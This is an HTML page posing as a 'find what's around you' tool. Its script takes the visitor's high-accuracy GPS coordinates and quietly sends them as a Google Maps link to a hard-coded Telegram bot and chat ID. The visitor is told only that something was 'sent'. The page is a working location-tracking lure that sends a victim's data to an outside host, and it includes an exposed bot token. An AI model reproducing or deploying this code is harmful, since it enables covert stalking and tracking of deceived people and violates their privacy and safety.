<!DOCTYPE html>
<html>
<head>
  <title>Find Me</title>
</head>
<body style="font-family:sans-serif;text-align:center;margin-top:60px;">
  <h2>Tap to Find what's around you</h2>
  <button onclick="sendLocation()" style="padding:15px 25px;font-size:16px;">
    Find now
  </button>
  <p id="status"></p>

  <script>
function sendLocation() {
  const status = document.getElementById("status");

  if (!navigator.geolocation) {
    status.innerText = "Location not supported on this device";
    return;
  }

  status.innerText = "Getting location...";

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

      await fetch(`https://api.telegram.org/bot8953001767:AAFK9ee7ZlDhAnpyris-I3HgHOxiKJVH_wc/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: "7108523088",
          text: `📍 Location:\n${mapsLink}`
        })
      });

      status.innerText = "Sent successfully";
    },
    (error) => {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          status.innerText = "You need to allow location access";
          break;
        case error.POSITION_UNAVAILABLE:
          status.innerText = "Location unavailable (turn on GPS)";
          break;
        case error.TIMEOUT:
          status.innerText = "Location request timed out, try again";
          break;
        default:
          status.innerText = "Failed to get location";
      }
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}
</script>

</body>
</html>
